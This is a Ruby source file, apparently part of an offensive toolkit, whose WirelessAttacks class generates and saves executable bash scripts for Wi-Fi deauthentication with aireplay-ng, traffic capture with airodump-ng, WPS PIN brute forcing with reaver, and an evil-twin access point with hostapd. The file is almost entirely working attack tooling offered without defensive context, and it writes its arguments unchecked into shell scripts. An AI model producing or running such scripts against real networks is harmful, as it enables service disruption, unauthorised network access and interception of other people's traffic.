require_relative '../utils/colorize'

class WirelessAttacks
  def self.generate_wifi_deauth(interface, target_mac, duration = 10)
    script = <<~SH
      #!/bin/bash
      
      INTERFACE="#{interface}"
      TARGET="#{target_mac}"
      DURATION=#{duration}
      
      if ! command -v aireplay-ng &> /dev/null; then
          echo "aireplay-ng not found. Install aircrack-ng suite."
          exit 1
      fi
      
      aireplay-ng --deauth $DURATION -a $TARGET $INTERFACE
    SH
    
    filename = "wifi_deauth_#{Time.now.to_i}.sh"
    File.write(filename, script)
    File.chmod(filename, 0755)
    puts Colorize.green("WiFi deauth script saved: #{filename}")
    filename
  end

  def self.generate_wifi_capture(interface, output_file = nil)
    output_file ||= "capture_#{Time.now.to_i}.cap"
    
    script = <<~SH
      #!/bin/bash
      
      INTERFACE="#{interface}"
      OUTPUT="#{output_file}"
      
      if ! command -v airodump-ng &> /dev/null; then
          echo "airodump-ng not found. Install aircrack-ng suite."
          exit 1
      fi
      
      airodump-ng -w $OUTPUT $INTERFACE
    SH
    
    filename = "wifi_capture_#{Time.now.to_i}.sh"
    File.write(filename, script)
    File.chmod(filename, 0755)
    puts Colorize.green("WiFi capture script saved: #{filename}")
    filename
  end

  def self.generate_wps_attack(interface, bssid)
    script = <<~SH
      #!/bin/bash
      
      INTERFACE="#{interface}"
      BSSID="#{bssid}"
      
      if ! command -v reaver &> /dev/null; then
          echo "reaver not found. Install reaver."
          exit 1
      fi
      
      reaver -i $INTERFACE -b $BSSID -vv
    SH
    
    filename = "wps_attack_#{Time.now.to_i}.sh"
    File.write(filename, script)
    File.chmod(filename, 0755)
    puts Colorize.green("WPS attack script saved: #{filename}")
    filename
  end

  def self.generate_evil_twin(interface, ssid)
    script = <<~SH
      #!/bin/bash
      
      INTERFACE="#{interface}"
      SSID="#{ssid}"
      
      if ! command -v hostapd &> /dev/null; then
          echo "hostapd not found. Install hostapd."
          exit 1
      fi
      
      cat > /tmp/hostapd.conf << EOF
      interface=$INTERFACE
      driver=nl80211
      ssid=$SSID
      hw_mode=g
      channel=6
      macaddr_acl=0
      ignore_broadcast_ssid=0
      EOF
      
      hostapd /tmp/hostapd.conf
    SH
    
    filename = "evil_twin_#{Time.now.to_i}.sh"
    File.write(filename, script)
    File.chmod(filename, 0755)
    puts Colorize.green("Evil twin script saved: #{filename}")
    filename
  end
end

